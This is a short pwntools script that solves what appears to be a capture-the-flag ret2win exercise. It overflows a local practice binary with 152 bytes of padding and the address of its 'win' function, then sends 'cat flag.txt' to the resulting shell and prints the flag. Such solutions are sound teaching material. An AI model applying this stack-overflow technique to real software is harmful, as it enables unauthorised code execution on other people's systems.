from pwn import *
from time import sleep

# make pwntools shut up!!!
logging.getLogger('pwnlib').setLevel(logging.WARNING)

binary = '../bins3/bin-ret2win-11'
elf = ELF(binary)
rop = ROP(elf)

buf = b'A'*152

win = p64(elf.sym['win'])

io = process(binary)
io.sendline(buf + win)
sleep(0.1)
io.sendline(b'cat flag.txt')
io.recvuntil(b'flag')
print("flag" + io.recvuntil(b'}').decode('utf-8'))
